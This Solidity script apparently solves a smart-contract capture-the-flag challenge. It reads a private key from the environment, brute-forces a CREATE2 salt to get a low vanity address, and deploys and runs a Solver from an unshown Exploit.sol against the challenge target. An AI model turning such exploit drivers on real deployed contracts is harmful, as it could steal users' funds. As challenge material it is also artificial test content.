// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {ExploitImpl, Solver} from "./Exploit.sol";

interface Vm {
    function envUint(string calldata name) external returns (uint256);
    function addr(uint256 privateKey) external returns (address);
    function getNonce(address account) external returns (uint64);
    function computeCreateAddress(address deployer, uint256 nonce) external returns (address);
    function startBroadcast(uint256 privateKey) external;
    function stopBroadcast() external;
}

interface Setup {
    function TARGET() external view returns (address);
    function isSolved() external view returns (bool);
}

contract Solve {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    function run(address setupAddress, bytes calldata card) external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address player = vm.addr(privateKey);
        address target = Setup(setupAddress).TARGET();
        address predictedSolver = vm.computeCreateAddress(player, vm.getNonce(player));

        bytes32 salt;
        bool found;
        bytes32 initHash = keccak256(
            abi.encodePacked(type(ExploitImpl).creationCode, abi.encode(target))
        );
        for (uint256 i; i < 1_000_000; ++i) {
            address predictedImpl = _create2Address(predictedSolver, bytes32(i), initHash);
            if (uint160(predictedImpl) <= type(uint144).max) {
                salt = bytes32(i);
                found = true;
                break;
            }
        }
        require(found, "vanity address not found");

        vm.startBroadcast(privateKey);
        Solver solver = new Solver(target);
        require(address(solver) == predictedSolver, "solver address changed");
        solver.solve(salt, card);
        vm.stopBroadcast();

        require(Setup(setupAddress).isSolved(), "challenge not solved");
    }

    function _create2Address(address deployer, bytes32 salt, bytes32 initHash)
        private
        pure
        returns (address result)
    {
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, shl(248, 0xff))
            mstore(add(ptr, 1), shl(96, deployer))
            mstore(add(ptr, 21), salt)
            mstore(add(ptr, 53), initHash)
            result := and(keccak256(ptr, 85), 0xffffffffffffffffffffffffffffffffffffffff)
        }
    }
}
